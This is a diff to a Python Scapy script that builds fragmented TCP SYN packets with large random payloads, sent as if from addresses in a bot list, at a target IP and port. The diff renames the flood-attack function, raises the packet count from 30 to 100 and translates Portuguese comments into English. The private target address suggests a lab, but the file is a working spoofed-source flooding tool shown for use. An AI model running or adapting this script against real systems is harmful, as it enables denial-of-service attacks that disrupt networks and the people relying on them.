@@ -4,11 +4,13 @@ import time
 import ipaddress
 import os
 
+# TCP Real Frag
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
-BOTFILE = "bots.txt"
-PACKET_PAYLOAD_SIZE = 4000  # Payload grande para forçar fragmentação
-FRAGSIZE = 1480             # Tamanho do fragmento (típico para MTU Ethernet)
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
+PACKET_PAYLOAD_SIZE = 4000  # Big payload
+FRAGSIZE = 1480             # Typical MTU
 
 def load_bots(filename):
     bot_ips = []
@@ -20,7 +22,7 @@ def load_bots(filename):
                 bot_ips.append(ip)
     return bot_ips
 
-def run_tcp_flood_attack():
+def run_tcp_real_frag():
     bot_ips = load_bots(BOTFILE)
     numero_de_pacotes_enviados = 0
     lista_de_pacotes = []
@@ -31,21 +33,19 @@ def run_tcp_flood_attack():
         eth_layer = Ether()
         seq_num = random.randint(0, 4294967295)
         tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S', seq=seq_num, window=8192)
-        payload = os.urandom(PACKET_PAYLOAD_SIZE)  # Payload aleatório grande
+        payload = os.urandom(PACKET_PAYLOAD_SIZE)  # Random payload
 
-        # Monta o pacote IP/TCP + payload
         packet = ip_layer / tcp_layer / Raw(load=payload)
 
-        # Fragmenta o pacote IP
+        # Frag
         fragments = fragment(packet, fragsize=FRAGSIZE)
 
-        # Adiciona cada fragmento encapsulado na camada Ethernet
         for frag in fragments:
             lista_de_pacotes.append(eth_layer / frag)
             numero_de_pacotes_enviados += 1
-            if numero_de_pacotes_enviados == 30:
+            if numero_de_pacotes_enviados == NUM_PACKETS:
                 break
-        if numero_de_pacotes_enviados == 30:
+        if numero_de_pacotes_enviados == NUM_PACKETS:
             break
 
     start_time = time.perf_counter()
@@ -53,10 +53,10 @@ def run_tcp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 if __name__ == "__main__":
-    run_tcp_flood_attack()
+    run_tcp_real_frag()
 
-# sudo PYTHONPATH=$HOME/scapy python3 tcp_frag.py
+# sudo PYTHONPATH=$HOME/scapy python3 tcp_real_frag.py
